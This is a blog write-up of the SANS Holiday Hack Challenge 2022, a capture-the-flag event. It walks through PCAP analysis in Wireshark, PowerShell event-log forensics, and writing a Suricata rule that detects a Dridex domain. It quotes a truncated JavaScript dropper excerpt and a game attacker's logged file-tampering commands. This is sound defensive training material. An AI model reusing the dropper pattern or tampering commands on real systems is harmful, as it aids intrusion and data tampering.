SANS Christmas Challenge 2022
=============================
:date: 2023-01-06
:author: useless
:category: Write-up
:slug: sans-christmas-challenge-2022
:status: published

.. image:: /images/sans-christmas-challenge-2022/sans_christmas_challenge_2022_logo.png
    :alt: The SANS 2022 Christmas Challenge. In the background, a hill top,
        with a frozen castle and a frozen dungeon. In the foreground, the text
        "Holiday Hack Challenge 2022 now open".
    :align: center

Five Rings to rule them all, Five Rings to find them,

Five Rings to bring them all and in the darkness pwn them.

In the Land of Kringle where the Red-teamers lie.

*(see, I can mix it up)*

Here's my write-up for the `2022 SANS Christmas Challenge <https://holidayhackchallenge.com/2022/>`__.

.. contents:: Table of contents

Introduction
~~~~~~~~~~~~

New year, new KringleCon! However, Santa has lost his Five Golden Rings and
can't perform his magic. He has given us the task of retrieving them in the
caves that lay below his frozen castle. Let's go!

KringleCon Orientation
~~~~~~~~~~~~~~~~~~~~~~

.. image:: /images/sans-christmas-challenge-2022/jingleringford.png
    :alt: Jingle Ringford. She's an elf with pointy ears. She's wearing a white
        t-shirt, a brown skirt and black shoes. She also has a pink christmas
        hat on her head. She's smiling.
    :align: center

*Jingle Ringford says*

    Welcome to the North Pole, KringleCon, and the 2022 SANS Holiday Hack
    Challenge! I’m Jingle Ringford, one of Santa’s elves.

    Santa asked me to come here and give you a short orientation to this
    festive event.

    Before you move forward through the gate, I’ll ask you to accomplish a few
    simple tasks.

    First things first, here's your badge! It's the five golden rings in the
    middle of your avatar.

We now have a badge on our avatar.

.. image:: /images/sans-christmas-challenge-2022/jingleringford.png
    :alt: Jingle Ringford, same image as before.
    :align: center

*Jingle Ringford says*

    Great - now you're official!

    Click on the badge on your avatar. That’s where you will see your
    Objectives, Hints, and gathered Items for the Holiday Hack Challenge.

    We’ve also got handy links to the KringleCon talks and more there for you!

    Next, click on that machine to the left and create a crypto wallet for
    yourself. Don't lose that key!

We click on the KringleCoin Teller Machine to create our account:

.. image:: /images/sans-christmas-challenge-2022/wallet_creation_1.png
    :alt: The first screen of the KringleCoin Teller Machine. It reads:
        "KringleCoin Teller Machine - Account Creation. Welcome to the
        KringleCoin Network! We're glad you're here! Hello! This system is
        designed to help you with the process of creating a cryptocurrency
        wallet! We will do all of the tedious, difficult work for you - you
        just need to do one, VERY important thing: We're going to be showing
        you some very important information: YOU will need to keep track of it.
        If you lose the private key to your wallet... well, we don't even want
        to think about that.  Probably the only thing on earth that could save
        you is some genuine Santa-type magic... So please PLEASE get prepared
        to copy down the information we're going to present to you on the next
        screen."
        Below the text, there is a green button that reads "Click here when
        you're ready to proceed".
    :align: center

We click on the green button:

.. image:: /images/sans-christmas-challenge-2022/wallet_creation_2.png
    :alt: The second screen of the KringleCoin Teller Machine. It reads:
        "It appears that you currently do not have a KringleCoin wallet. You'll
        need one while you're here at the North Pole. Let's get started and set
        up your wallet. You'll earn KringleCoins for completing challenges or
        you just might be lucky enought to find some! Who knows!
        Your KringleCoin wallet consists of two values, a WalletAddress and a
        Private (Secret) Key.
        This is critically important: YOU are responsible for keeping track of
        your account information. If you come back here, we can tell you your
        WalletAddress, but (and this is very, VERY important) we CANNOT tell
        you your secret key. If you lose it, you lose access to your
        KringleCoins.
        Here is your KringleCoin wallet information:
        WalletAddress: an hexadecimal value
        Key: a censored hexadecimal value
    :align: center

Now you didn't think I would publish my secret key and let y'all steal my
precious KringleCoins, right?

.. image:: /images/sans-christmas-challenge-2022/jingleringford.png
    :alt: Jingle Ringford, same image as before.
    :align: center

*Jingle Ringford says*

    Fantastic!

    OK, one last thing. Click on the **Cranberry Pi Terminal** and follow the
    on-screen instructions.

The Cranberry Pi Terminal is divided in two panes: an upper pane that reads

.. code-block:: text

    Enter the answer here

    >

and a lower pane that reads:

.. code-block:: text

    Welcome to the first terminal challenge!

    This one is intentionaly simple. All we need to do is:

    - Click in the upper pane of this terminal
    - Type answer and press Enter

We do so, and bingo:

.. image:: /images/sans-christmas-challenge-2022/jingleringford.png
    :alt: Jingle Ringford, same image as before.
    :align: center

*Jingle Ringford says*

    Great! Your orientation is now complete! You can enter through the gate
    now. Have FUN!!!

We can now enter the North Pole, where we find Santa:

.. image:: /images/sans-christmas-challenge-2022/santa.png
    :alt: Santa Claus. He's wearing his usual attire: a red suit with a red
        Christmas hat, and a brown belt with a golden buckle.
    :align: center

*Santa says*

    Welcome to the North Pole, intrepid traveler!

    Wow, we had quite a storm last night!

    My castle door is sealed shut behind a giant snowbank.

    The Elves have decided to burrow under the snow to get everything ready for
    our holiday deliveries.

    But there's another wrinkle: my Five Golden Rings have gone missing.

    Without the magic of the Rings, we simply can't launch the holiday season.

    My reindeer won't fly; I won't be able to zip up and down chimneys.

    What's worse, without the magic Rings, I can't fit the millions of cookies
    in my belly!

    I challenge you to go on a quest to find and retrieve each of the five
    Rings.

    I'll put some initial goals in your badge for you.

    The holidays, and the whole world, are counting on you.

Recover the Tolkien Ring
~~~~~~~~~~~~~~~~~~~~~~~~

We go down under the snow, to recover the first ring, the Tolkien Ring, where
we come upon Grinchum:

.. image:: /images/sans-christmas-challenge-2022/smeagol.png
    :alt: Grinchum looks like an elf. He's crouching. His torso is bared and
        he's wearing a brown loincloth, and a red Christmas hat. He's frowning
        but he looks quite pleased. Anyway you get it, he looks like Gollum
        from The Lord of the Rings, but with a Christmas hat.
    :align: center

*Grinchum says*

    *Preciousesss....*

    *Don't worry, you are hidden. You are safe.*

Wireshark Practice
------------------

Moving on, we enter what looks like the kitchen, where we find Sparkle
Redberry.

.. image:: /images/sans-christmas-challenge-2022/sparkleredberry.png
    :alt: Sparkle Redberry is an elf with green skin. He's wearing a white
        sweater with green pants and purple shoes. He also has a green
        Christmas hat on his head. He looks non-plussed.
    :align: center

*Sparkle Redberry says*

    Hey there! I’m Sparkle Redberry. We have a bit of an incident here.

    We were baking lembanh in preparation for the holidays.

    It started to smell a little funky, and then suddenly, a Snowrog crashed through the wall!

    We're trying to investigate what caused this, so we can make it go away.

    Have you used Wireshark to look at packet capture (PCAP) files before?

    I've got a `PCAP </docs/sans-christmas-challenge-2022/suspicious.pcap>`__
    you might find interesting.

    Once you've had a chance to look at it, please open this terminal and answer the questions in the top pane.

    Thanks for helping us get to the bottom of this!

Let's download the given PCAP and open up the terminal:

.. code-block:: text

    There are objects in the PCAP file that can be exported by Wireshark and/or
    Tshark. What type of objects can be exported from this PCAP?

Let's open the PCAP file in Wireshark:

.. image:: /images/sans-christmas-challenge-2022/tolkien_ring_wireshark_init.png
    :alt: The suspicious.pcap file opened in Wireshark. We mostly see HTTP
        traffic.
    :align: center

It looks like this is mainly HTTP traffic. If we go to the :code:`File >
Export Objects` menu in Wireshark, we can see several object types, but only
the :code:`HTTP` entry gives us a file that can be extracted:

.. image:: /images/sans-christmas-challenge-2022/tolkien_ring_wireshark_file_export.png
    :alt: The HTTP file export functionality. We see three entries:
        1. app.php, size of 754 bytes, starts at packet number 8.
        2. app.php (again), size of 808 kB, starts at packet number 687.
        3. favicon.ico, size of 1130 bytes, starts at packet number 692.
    :align: center

So, the answer is :code:`HTTP`.

.. code-block:: text

    What is the file name of the largest file we can export?

We can easily see from the previous screenshot that, with a size of 808 kB,
the :code:`app.php` file is the largest.

.. code-block:: text

    What packet number starts that app.php file?

There are two entries for the :code:`app.php` file, however, the largest one
starts at packet number :code:`687`.

.. code-block:: text

    What is the IP of the Apache server?

Let's go to packet number :code:`687`:

.. image:: /images/sans-christmas-challenge-2022/tolkien_ring_wireshark_apache_ip.png
    :alt: Packet 687. We see the response from the Apache server, with a source
        IP of 192.185.57.242.
    :align: center

We can see that the HTTP server is responding with an HTTP code 200. Therefore,
the source IP address corresponds to the Apache server: :code:`192.185.57.242`.

.. code-block:: text

    What file is saved to the infected host?

Let's use the :code:`File > Export Objects > HTTP` menu to export the large
:code:`app.php` file. If we take a look inside, we can see that a large blob
is base64-decoded, before being saved to file:

.. code-block:: js
    :hl_lines: 13

    (function() {
        let byteCharacters = atob('UEsDBBQAAAAIAFCjN1FIq7H4ezsJAI[...]JAAAA');

        let byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        let byteArray = new Uint8Array(byteNumbers);

        // now that we have the byte array, construct the blob from it
        let blob1 = new Blob([byteArray], {type: 'application/octet-stream'});

        saveAs(blob1, 'Ref_Sept24-2020.zip');

    })();

The file is named :code:`Ref_Sept24-2020.zip`.

.. code-block:: text

    Attackers used bad TLS certificates in this traffic. Which countries were
    they registered to? Submit the names of the countries in alphabetical
    order separated by commas (Ex: Norway, South Korea).

Let's use some :code:`tshark` to easily extract the value of the field we are
interested in. The interesting field name to extract the country a certificate
was registered to is `x509sat.CountryName <https://www.wireshark.org/docs/dfref/x/x509sat.html>`__.
With a little clean-up, we get the following country names:

.. code-block:: console

    $ tshark -r suspicious.pcap -T fields -e x509sat.CountryName | tr ',' '\n' | sort -u

    IE
    IL
    SS
    US

By using the full names of the countries, we get :code:`Ireland, Israel, South
Sudan, United States of America`.

.. code-block:: text

    Is the host infected (Yes/No)?

Well if some weird behavior has been observed, it's most likely that the host
has been infected: :code:`Yes`.

After answering all questions properly, we talk to Sparkle Redberry again:

.. image:: /images/sans-christmas-challenge-2022/sparkleredberry.png
    :alt: Sparkle Redberry, same image as before.
    :align: center

*Sparkle Redberry says*

    You got it - wonderful!

    So hey, when you're looking at the next terminal, remember you have
    multiple filetypes and tools you can utilize.

    Conveniently for us, we can use programs already installed on every Windows
    computer.

    So if you brought your own Windows machine, you can save the files to it
    and use whatever method is your favorite.

    Oh yeah! If you wanna learn more, or get stuck, I hear `Eric Pursley's
    <https://youtu.be/5NZeHYPMXAE>`__ talk is about this very topic.

Windows Event Logs
------------------

We move on to find Dusty Giftwrap:

.. image:: /images/sans-christmas-challenge-2022/dustygiftwrap.png
    :alt: Dusty Giftwrap is an elf with glasses and a white beard. He's wearing
        a green coat with white fur, a brown skirt, black shoes, and a purple
        Christmas hat.
    :align: center

*Dusty Giftwrap says*

    Hi! I'm Dusty Giftwrap!

    We think the Snowrog was attracted to the pungent smell from the baking lembanh.

    I'm trying to discover which ingredient could be causing such a stench.

    I think the answer may be in these suspicious logs.

    I'm focusing on Windows Powershell logs. Do you have much experience there?

    You can work on this `offline </docs/sans-christmas-challenge-2022/powershell.evtx>`__
    or try it in this terminal.

    Golly, I'd appreciate it if you could take a look.

Let's lend a hand:

.. code-block:: text

    Grinchum successfully downloaded his keylogger and has gathered the admin
    credentials!

    We think he used PowerShell to find the Lembanh recipe and steal our secret
    ingredient.

    Luckily, we enabled PowerShell auditing and have exported the Windows
    PowerShell logs to a flat text file.

    Please help me analyze this file and answer my questions.

    Ready to begin?

Ready!

.. code-block:: text

    1. What month/day/year did the attack take place? For example, 09/05/2021.

Let's use `evtx <https://github.com/omerbenamram/evtx>`__ to easily parse the
EVTX file, by converting it to JSON:

.. code-block:: console

    $ ~/bin/evtx/evtx -o json -f powershell.json powershell.evtx

Now, let's search for :code:`Lembanh` in the file. We see some weird stuff
around here:

.. code-block:: json
    :hl_lines: 44

    {
      "Event": {
        "#attributes": {
          "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
        },
        "EventData": {
          "ContextInfo": "        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = 21ec2576-2920-4c0f-8047-0b85ad219ffa\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 4181eda9-20e6-4eb9-8869-fe5fa6d5e663\r\n        Pipeline ID = 257\r\n        Command Name = \r\n        Command Type = Script\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 1703\r\n        User = DESKTOP-R65OKRB\\Chris Massey\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n",
          "Payload": "CommandInvocation(Out-Default): \"Out-Default\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"Recipe from Mixolydian, the Queen of Dorian\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"Lembanh Original Recipe\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\" \"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"2 1/2 all purpose flour\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"1 Tbsp baking powder\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"1/4 tsp salt\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"1/2 c  butter\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"1/3 c brown sugar\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"1 tsp cinnamon\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"1/2 tsp honey (secret ingredient)\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"2/3 c heavy whipping cream\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"1/2 tsp vanilla extract\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"Preheat oven to 425F. Mix the flour, baking powder and salt into a large bowl. Add the butter and mix with a well till fine granules (easiest way is with an electric mixer). Then add the sugar and cinnamon, and mix them thoroughly.\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"Finally add the cream, honey, and vanilla and stir them in with a fork until a nice, thick dough forms.\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"Roll the dough out about 1/2 in thickness. Cut out 3-inch squares and transfer the dough to a cookie sheet.Criss-cross each square from corner-to-corner with a knife, lightly (not cutting through the dough).\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"Bake for about 12 minutes or more (depending on the thickness of the bread) until it is set and lightly golden.\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"Let cool completely before eating, this bread tastes better room temperature and dry. Also for more flavor you can add more cinnamon or other spices\"\r\n",
          "UserData": ""
        },
        "System": {
          "Channel": "Microsoft-Windows-PowerShell/Operational",
          "Computer": "DESKTOP-R65OKRB",
          "Correlation": {
            "#attributes": {
              "ActivityID": "54BDC5C1-F7AB-0001-FA72-BF54ABF7D801"
            }
          },
          "EventID": 4103,
          "EventRecordID": 7905,
          "Execution": {
            "#attributes": {
              "ProcessID": 1216,
              "ThreadID": 4080
            }
          },
          "Keywords": "0x0",
          "Level": 4,
          "Opcode": 20,
          "Provider": {
            "#attributes": {
              "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
              "Name": "Microsoft-Windows-PowerShell"
            }
          },
          "Security": {
            "#attributes": {
              "UserID": "S-1-5-21-3359507890-24144431-3438718502-1002"
            }
          },
          "Task": 106,
          "TimeCreated": {
            "#attributes": {
              "SystemTime": "2022-12-24T11:01:03.659392Z"
            }
          },
          "Version": 1
        }
      }
    }

The attack took place on :code:`12/24/2022`.

.. code-block:: text

    2. An attacker got a secret from a file. What was the original file's name?

Let's look at the :code:`ScriptBlockText` attribute of the events. It contains
the PowerShell scripts that were executed. Let's also look for a keyword such
as :code:`recipe`:

.. code-block:: console
    :hl_lines: 3

    $ grep -iE 'ScriptBlockText.*recipe' powershell.json
          "ScriptBlockText": "echo \"Dec 18 2022 `nLembanh! Santa wants us to try making some this year. We searched everywhere for this recipe that's supposed to have the secret ingredient to really make it authentic. It's gonna be delicious, I'm so excited!\" >> mydiary.txt"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'\n"
          "ScriptBlockText": "cat .\\recipe_updated.txt\n"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "del .\\Recipe.txt"
          "ScriptBlockText": "del .\\recipe_updated.txt"

Apparently, the file is called :code:`Recipe`.

.. code-block:: text

    3. The contents of the previous file were retrieved, changed, and stored to
    a variable by the attacker. This was done multiple times. Submit the last
    full PowerShell line that performed only these actions.

So, the command must retrieve the content, modify it, and store it in a
variable. We can actually see that from our last command:

.. code-block:: console
    :hl_lines: 16

    $ grep -iE 'ScriptBlockText.*recipe' powershell.json
          "ScriptBlockText": "echo \"Dec 18 2022 `nLembanh! Santa wants us to try making some this year. We searched everywhere for this recipe that's supposed to have the secret ingredient to really make it authentic. It's gonna be delicious, I'm so excited!\" >> mydiary.txt"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'\n"
          "ScriptBlockText": "cat .\\recipe_updated.txt\n"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "del .\\Recipe.txt"
          "ScriptBlockText": "del .\\recipe_updated.txt"

The last PowerShell line is:

.. code-block:: powershell

    $foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}

.. code-block:: text

    4. After storing the altered file contents into the variable, the attacker
    used the variable to run a separate command that wrote the modified data
    to a file. This was done multiple times. Submit the last full PowerShell
    line that performed only this action.

So this time the command only stores our variable to a file. This can *still*
be seen in our previous command:

.. code-block:: console
    :hl_lines: 18

    $ grep -iE 'ScriptBlockText.*recipe' powershell.json
          "ScriptBlockText": "echo \"Dec 18 2022 `nLembanh! Santa wants us to try making some this year. We searched everywhere for this recipe that's supposed to have the secret ingredient to really make it authentic. It's gonna be delicious, I'm so excited!\" >> mydiary.txt"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'\n"
          "ScriptBlockText": "cat .\\recipe_updated.txt\n"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "del .\\Recipe.txt"
          "ScriptBlockText": "del .\\recipe_updated.txt"

The command is:

.. code-block:: powershell

    $foo | Add-Content -Path 'Recipe'

.. code-block:: text

    5. The attacker ran the previous command against one file multiple times. What
    is the name of this file?

Let's search for :code:`Add-Content`:

.. code-block:: console
    :hl_lines: 5 6 7

    $ grep -iE 'ScriptBlockText.*Add-Content' powershell.json
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'\n"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe'"

The file is :code:`Recipe.txt`.

.. code-block:: text

    6. Were any files deleted (Yes/No)?

Let's go to our trusty first command. We can see that two files were deleted:

.. code-block:: console
    :hl_lines: 20 21

    $ grep -iE 'ScriptBlockText.*recipe' powershell.json
          "ScriptBlockText": "echo \"Dec 18 2022 `nLembanh! Santa wants us to try making some this year. We searched everywhere for this recipe that's supposed to have the secret ingredient to really make it authentic. It's gonna be delicious, I'm so excited!\" >> mydiary.txt"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'\n"
          "ScriptBlockText": "cat .\\recipe_updated.txt\n"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "del .\\Recipe.txt"
          "ScriptBlockText": "del .\\recipe_updated.txt"

Therefore, the answer is :code:`Yes`.

.. code-block:: text

    7. Was the original file (from question 2) deleted (Yes/No)?

The file from question 2 was called :code:`Recipe` (no :code:`.txt`). It does
not appear to have been deleted, so the answer is :code:`No`.

.. code-block:: text

    8. What is the Event ID of the logs that show the actual command lines the
    attacker typed and ran?

Let's see the ID associated with events with a :code:`ScriptBlockText`
attribute:

.. code-block:: console

    $ grep -E 'ScriptBlockText|EventID' powershell.json | grep -A 1 ScriptBlockText | grep EventID | sort -u
          "EventID": 4104,

First, we extract the attributes :code:`ScriptBlockText` and :code:`EventID`.
Then we :code:`grep` for :code:`ScriptBlockText` and the line after. This
should give us the associated :code:`EventID`. We'll then :code:`grep` for
only the :code:`EventID`, and get the unique result: :code:`4104`.

.. code-block:: text

    9. Is the secret ingredient compromised (Yes/No)?
    10. What is the secret ingredient?

We can easily answer the two last questions by taking a look at the results
from our trusty one-liner:

.. code-block:: console
    :hl_lines: 4

    $ grep -iE 'ScriptBlockText.*recipe' powershell.json
          "ScriptBlockText": "echo \"Dec 18 2022 `nLembanh! Santa wants us to try making some this year. We searched everywhere for this recipe that's supposed to have the secret ingredient to really make it authentic. It's gonna be delicious, I'm so excited!\" >> mydiary.txt"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'\n"
          "ScriptBlockText": "cat .\\recipe_updated.txt\n"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'recipe_updated.txt'"
          "ScriptBlockText": "cat .\\recipe_updated.txt"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_-replace 'honey','fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'}"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe.txt'"
          "ScriptBlockText": "$foo | Add-Content -Path 'Recipe'"
          "ScriptBlockText": "cat .\\Recipe"
          "ScriptBlockText": "del .\\Recipe.txt"
          "ScriptBlockText": "del .\\recipe_updated.txt"

We see that the word :code:`honey` was replaced with :code:`fish oil`.
Therefore, the most likely scenario is that honey is the secret ingredient, but
Grinchum replaced it with fish oil in the recipe.

The fish oil must be what attracted the Snowrog.

.. image:: /images/sans-christmas-challenge-2022/dustygiftwrap.png
    :alt: Dusty Giftwrap, same image as before.
    :align: center

*Dusty Giftwrap says*

    Say, you did it! Thanks a million!

    Now we can mix in the proper ingredients and stop attracting the Snowrog!

    I'm all set now! Can you help Fitzy over there wield the exalted Suricata?

    It can be a bit mystifying at first, but this `Suricata Tome
    <https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html>`__
    should help you fathom it.

    I sure hope you can make it work!

Suricata Regatta
----------------

.. image:: /images/sans-christmas-challenge-2022/fitzyshortstack.png
    :alt: Dusty Giftwrap is an elf with almond-shaped eyes, a beard and
        glorious mustache. He's wearing a white shirt, with a brown skirt and
        suspenders, and black shoes. He's wearing a turquoise Christmas hat.
    :align: center

*Fitzy Shortstack says*

    Hm?.. Hello...

    Sorry, I don't mean to be uncharaceristically short with you.

    There's just this abominable Snowrog here, and I'm trying to comprehend
    Suricata to stop it from getting into the kitchen.

    I believe that if I can phrase these Suricata incantations correctly,
    they'll create a spell that will generate warnings.

    And hopefully those warnings will scare off the Snowrog!

    Only... I'm quite baffled. Maybe you can give it a go?

And indeed, we see the Snowrog barring the way:

.. image:: /images/sans-christmas-challenge-2022/snowrog.png
    :alt: The Snowrog is a giant anthropomorphic snow monster. It's a basically
        a snow Balrog.
    :align: center

*The Snowrog says*

    *Fierce gusts of wind wreath about it and snow swirls in its aura*

    *Its frozen mane shimmers, and chilled air fogs behind it*

    *Its left hand made of fingers of tongue-affixing icicles*

    *Its right a fist like that of a densely packed snowball*

    *The Snowrog focuses on you with an icy-cold glare*

    *And bellows a roar more thunderous than an avalanche*

Let's get rid of it!

.. code-block:: text
    :hl_lines: 7 8

    Use your investigative analysis skills and the suspicious.pcap file to help develop Suricata rules for the elves!

    There's a short list of rules started in suricata.rules in your home directory.

    First off, the STINC (Santa's Team of Intelligent Naughty Catchers) has a lead for us.
    They have some Dridex indicators of compromise to check out.
    First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk.
    Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection.
    Add your rule to suricata.rules

    Once you think you have it right, run ./rule_checker to see how you've done!
    As you get rules correct, rule_checker will ask for more to be added.

    If you want to start fresh, you can exit the terminal and start again or cp suricata.rules.backup suricata.rules

    Good luck, and thanks for helping save the North Pole!

I don't use Suricata in my day-to-day work. To create the rules, you can take
inspiration from the previous rules in the :code:`suricata.rules` file, or look
at `the documentation <https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html>`__.
It seems to be important to have a unique :code:`sid` for each created rule,
so keep that in mind.

Let's create the DNS rule:

.. code-block:: text

    alert dns any any -> any any (msg:"Known bad DNS lookup, possible Dridex infection"; dns.query; content:"adv.epostoday.uk"; nocase; sid:1337;)

Now we can run the rule checker:

.. code-block:: console
    :hl_lines: 6 9 10

    elf@703ea04f1883:~$ ./rule_checker
    3/1/2023 -- 14:26:55 - <Notice> - This is Suricata version 6.0.8 RELEASE running in USER mode
    3/1/2023 -- 14:26:55 - <Notice> - all 5 packet processing threads, 4 management threads initialized, engine started.
    3/1/2023 -- 14:26:55 - <Notice> - Signal Received.  Stopping engine.
    3/1/2023 -- 14:26:55 - <Notice> - Pcap-file module read 1 files, 5172 packets, 3941260 bytes
